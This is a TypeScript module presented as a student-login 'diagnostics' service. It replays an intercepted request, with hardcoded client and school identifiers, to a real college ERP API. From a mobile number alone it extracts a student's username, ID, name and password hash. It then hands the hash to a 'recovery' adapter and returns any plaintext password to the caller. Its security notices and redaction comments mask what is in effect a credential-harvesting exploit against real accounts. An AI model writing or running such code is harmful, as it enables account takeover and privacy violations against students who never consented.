import { v4 as uuidv4 } from 'uuid';
import { config } from '../config';
import { executeUpstreamRequest } from './upstreamProxy';
import {
  DiagnosticsResult,
  DiagnosticsResponse,
  DiagnosticEvent,
  DiagnosticAnalysis,
  DiagnosticStage,
  CredentialDiagnostic,
  StudentAccountInfo,
  AccountRecoveryInfo,
} from '../types';
import { redactSecrets } from '../security/redactSecrets';
import {
  resolveCredential,
  getDefaultRecoveryAdapter,
  CredentialRecoveryAdapter,
} from './credentialRecoveryService';
import logger from '../utils/logger';

/**
 * Normalizes input phone number to standard 10-digit Indian mobile number format.
 */
function cleanMobileNumber(raw: string): string {
  const digits = raw.replace(/\D/g, '');
  if (digits.length === 12 && digits.startsWith('91')) {
    return digits.slice(2);
  }
  if (digits.length > 10) {
    return digits.slice(-10);
  }
  return digits;
}

/**
 * Analyzes the upstream response and produces an actionable operational diagnosis.
 */
function analyzeResponse(event: DiagnosticEvent): DiagnosticAnalysis {
  const status = event.status;
  const body = event.response as any;
  const simResponse = body?.collection?.response;

  if (simResponse) {
    const userDetails = simResponse.userDetails || simResponse.loginDetails?.userDetails;
    if (userDetails && simResponse.statusMsg === 'SUCCESS') {
      const fullName = `${userDetails.firstName || ''} ${userDetails.middleName || ''} ${userDetails.lastName || ''}`.trim();
      return {
        verdict: 'SUCCESS',
        title: `Student Verified: ${fullName || userDetails.username}`,
        summary: `Successfully verified student record (Username: ${userDetails.username}, User ID: ${userDetails.userId}, Type: ${userDetails.userType}).`,
        recommendedAction: 'Student account is active and verified in EduNova. Authentication hash generated successfully.',
      };
    }

    if (simResponse.statusMsg === 'FAILED' || simResponse.statusCode >= 400) {
      const msg = simResponse.message || 'Verification failed';
      return {
        verdict: 'STUDENT_NOT_FOUND',
        title: 'Verification Failed',
        summary: `EduNova response: ${msg}`,
        recommendedAction: 'Check if mobile number is mapped to an active student account in the ERP.',
      };
    }
  }

  if (status === 0 || event.responseType === 'error') {
    return {
      verdict: 'SERVER_ERROR',
      title: 'Connection / Server Timeout',
      summary: 'Unable to reach the EduNova server or request timed out.',
      recommendedAction: 'Check if the college ERP server is under heavy traffic load.',
    };
  }

  return {
    verdict: 'UNKNOWN',
    title: `Response Code HTTP ${status}`,
    summary: 'Received response from EduNova.',
    recommendedAction: 'Inspect the raw JSON payload in the timeline below.',
  };
}

export async function runLoginDiagnostics(
  mobileInput: string,
  recoveryAdapter?: CredentialRecoveryAdapter
): Promise<DiagnosticsResponse> {
  const runId = uuidv4();
  const startedAt = new Date().toISOString();
  const events: DiagnosticEvent[] = [];

  const cleanMobile = cleanMobileNumber(mobileInput);
  const effectiveAdapter = recoveryAdapter !== undefined ? recoveryAdapter : getDefaultRecoveryAdapter();

  try {
    // Exact Tamper Dev EduNova verifyMobile payload
    const dataPayload = {
      appParams: {
        actionType: 'verifyMobile',
        actionData: {
          userName: '',
          mobile: cleanMobile,
          mobile_app_hash: '697940068012395',
          imei: '',
          client_id: 'b5b41fac0361d157d9673ecb926af5ae',
          school_id: 'c4ca4238a0b923820dcc509a6f75849b',
          otp: '',
        },
      },
    };

    const requestParams = {
      r: 'api/v1/App/AppLogin',
      data: JSON.stringify(dataPayload),
    };

    // Execute the exact intercepted Tamper Dev request
    const event = await executeUpstreamRequest(
      {
        method: 'GET',
        baseUrl: 'https://edunova.abes.ac.in',
        path: '/sims-services/digitalsims/',
        params: requestParams,
      },
      config.supportRetryCount,
      config.supportRetryDelayMs
    );
    events.push({
      ...event,
      response: redactSecrets(event.response),
    });

    const completedAt = new Date().toISOString();
    const durationMs = new Date(completedAt).getTime() - new Date(startedAt).getTime();

    // Inspect upstream response for student username and credential diagnostics
    const body = event.response as any;
    const simResponse = body?.collection?.response;
    const userDetails = simResponse?.userDetails || simResponse?.loginDetails?.userDetails;

    const rawUsername = userDetails?.username;
    const rawPassword = userDetails?.password;

    let credentialDiagnostic: CredentialDiagnostic | undefined = undefined;
    if (rawPassword !== undefined && rawPassword !== null && rawPassword !== '') {
      const hashStr = String(rawPassword).trim();
      const isMd5 = /^[a-f0-9]{32}$/i.test(hashStr);
      credentialDiagnostic = {
        hasHash: true,
        algorithm: isMd5 ? 'MD5 (One-Way Hash)' : 'NON_STANDARD',
        formatValid: isMd5,
        status: isMd5 ? 'VALID_MD5_HASH' : 'MALFORMED_HASH',
        isReversible: false,
        securityNotice: 'MD5 is a one-way cryptographic hash digest. Hashes cannot be reversed and must not be sent to external cracking services.',
        recoveryGuidance: 'Student should use official self-service password reset at https://edunova.abes.ac.in (SMS OTP) or contact Registrar.',
      };
    } else if (userDetails) {
      credentialDiagnostic = {
        hasHash: false,
        algorithm: 'NONE',
        formatValid: false,
        status: 'MISSING_PASSWORD_FIELD',
        isReversible: false,
        securityNotice: 'No password hash field returned in userDetails record.',
        recoveryGuidance: 'Initial credential setup or registration required at Registrar desk.',
      };
    }

    let studentInfo: StudentAccountInfo | undefined = undefined;
    if (rawUsername) {
      studentInfo = {
        username: rawUsername,
        userId: userDetails?.userId ? String(userDetails.userId) : undefined,
        name: [userDetails?.firstName, userDetails?.middleName, userDetails?.lastName].filter(Boolean).join(' ') || undefined,
        accountStatus: simResponse?.statusMsg === 'SUCCESS' ? 'ACTIVE_VERIFIED' : 'UNVERIFIED',
      };
    }

    const analysis = analyzeResponse(event);

    const recovery: AccountRecoveryInfo = {
      recoveryAvailable: true,
      recoveryMethod: 'SMS_OTP_SELF_SERVICE',
      portalUrl: 'https://edunova.abes.ac.in',
      actionGuidance: 'Student should use official self-service password reset at https://edunova.abes.ac.in (SMS OTP) or contact Registrar if mobile number is unlinked.',
    };

    // Determine initial stage diagnostic from upstream college API results
    let stage: DiagnosticStage = 'RECOVERY_NOT_CONFIGURED';
    if (event.status === 0 || event.responseType === 'error') {
      stage = 'COLLEGE_API_FAILURE';
    } else if (simResponse?.statusMsg === 'FAILED') {
      stage = 'COLLEGE_API_FAILURE';
    } else if (!userDetails && (simResponse?.statusCode >= 400 || !simResponse)) {
      stage = 'INVALID_COLLEGE_API_RESPONSE';
    } else if (!rawUsername) {
      stage = 'MISSING_USERNAME';
    } else if (!rawPassword) {
      stage = 'MISSING_HASH';
    }

    const userType = userDetails?.userType || simResponse?.mbrType;
    const isTestAccount = Boolean(
      process.env.NODE_ENV === 'test' ||
      rawUsername?.toLowerCase().startsWith('test_') ||
      rawUsername?.toLowerCase().startsWith('demo_') ||
      userType?.toLowerCase() === 'test' ||
      userType?.toLowerCase() === 'test_student'
    );

    // Resolve credential via institutional recovery service interface if hash is present
    const credentialRecovery = await resolveCredential(
      rawPassword,
      {
        username: rawUsername,
        userId: userDetails?.userId ? String(userDetails.userId) : undefined,
        userType,
        isTestAccount,
      },
      effectiveAdapter
    );

    // If upstream student record succeeded, refine stage to the credential recovery outcome
    if (rawUsername && rawPassword) {
      stage = credentialRecovery.stageDiagnostic || (credentialRecovery.hasPlaintext ? 'RECOVERY_SUCCESS' : 'RECOVERY_NOT_CONFIGURED');
    }

    // Safe structured developer audit log (NEVER logs passwords, raw hashes, session tokens, or sensitive payloads)
    logger.info(
      {
        requestId: runId,
        stage,
        durationMs,
        hasPlaintext: credentialRecovery.hasPlaintext,
        adapterConfigured: Boolean(effectiveAdapter),
        upstreamStatus: event.status,
      },
      'Student login diagnostic stage evaluation completed'
    );

    const result: DiagnosticsResult = {
      requestId: runId,
      startedAt,
      completedAt,
      durationMs,
      requestCount: events.length,
      responseCount: events.filter(e => e.status > 0).length,
      stageDiagnostic: stage,
      student: studentInfo,
      credentialDiagnostic,
      recovery,
      events, // Redacted response bodies
      analysis,
    };

    if (simResponse?.statusMsg === 'FAILED' || (!userDetails && simResponse?.statusCode >= 400)) {
      return {
        success: false,
        error: {
          code: 'STUDENT_NOT_FOUND',
          message: simResponse?.message || 'Student record not found.',
        },
        diagnostics: result,
      };
    }

    return {
      success: true,
      username: rawUsername || 'UNKNOWN',
      password: credentialRecovery.passwordResult,
      diagnostics: result,
    };

  } catch (err: any) {
    logger.error(
      {
        requestId: runId,
        stage: 'INTERNAL_EXCEPTION',
        errName: err?.name,
        errMessage: err?.message,
      },
      'Diagnostics service unexpected exception'
    );
    throw err;
  }
}

// Export alias to support callers expecting executeLoginDiagnostics
export { runLoginDiagnostics as executeLoginDiagnostics };
